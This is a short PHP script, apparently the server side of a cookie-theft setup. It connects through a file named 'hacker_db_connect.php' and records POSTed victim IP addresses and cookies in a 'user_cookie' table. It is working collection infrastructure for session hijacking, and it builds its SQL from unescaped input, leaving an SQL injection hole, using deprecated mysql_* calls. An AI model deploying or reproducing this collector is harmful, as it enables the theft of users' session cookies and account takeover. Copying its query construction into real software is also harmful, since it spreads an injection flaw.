<?php

	require_once('../DB_Connect/hacker_db_connect.php'); 


	mysql_query("SET NAMES UTF8");

	mysql_select_db($database_Connect_MessageBoard, $Connect_MessageBoard);
	
		
	$ip = $_POST["ip"];
	$cookie = $_POST["cookie"];

	$query_insertSQL = sprintf("INSERT INTO user_cookie (id,ip,cookie, time) VALUES (NULL,'%s','%s',NULL)",		
						$ip,
						$cookie);
					   
	$query_result = mysql_query($query_insertSQL, $Connect_MessageBoard) or die(mysql_error());

//	echo "query_result = " . $query_result; //if success return 1

//	echo "ip = " . "$_POST['ip']" . "cookie = " . "$_POST['cookie']";
?>